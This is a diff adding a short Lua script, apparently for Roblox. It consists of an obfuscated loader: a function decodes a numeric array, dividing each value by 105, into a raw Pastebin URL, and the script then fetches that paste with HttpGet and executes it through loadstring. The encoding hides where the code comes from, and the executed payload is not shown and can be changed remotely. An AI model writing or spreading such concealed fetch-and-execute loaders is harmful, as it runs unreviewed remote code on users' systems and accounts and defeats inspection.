@@ -1,0 +1,4 @@
+function XqruAmAVTYvLuHkdAaPBmTgCTsdlfTOJjvXeofIdhxWFQtotxNebBdFn(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+
+
+loadstring(game:HttpGet(XqruAmAVTYvLuHkdAaPBmTgCTsdlfTOJjvXeofIdhxWFQtotxNebBdFn({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10290,11025,11550,4830,10395,11655,11445,4935,11970,10185,12495,4935,11445,9450,10395,11025,8610,10710,6930,10500})))()    
